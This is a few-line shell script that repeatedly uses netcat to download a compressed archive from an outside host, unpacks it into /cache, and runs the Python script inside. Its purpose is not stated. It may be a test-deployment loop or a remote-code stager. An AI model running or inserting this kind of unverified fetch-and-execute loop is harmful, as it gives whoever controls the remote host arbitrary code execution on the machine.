
cd /cache

while sleep 1; do
	nc t.elektromanye.tk 1234 | xz -dc | tar xv || continue
	./bin/python3 -v test.py
done
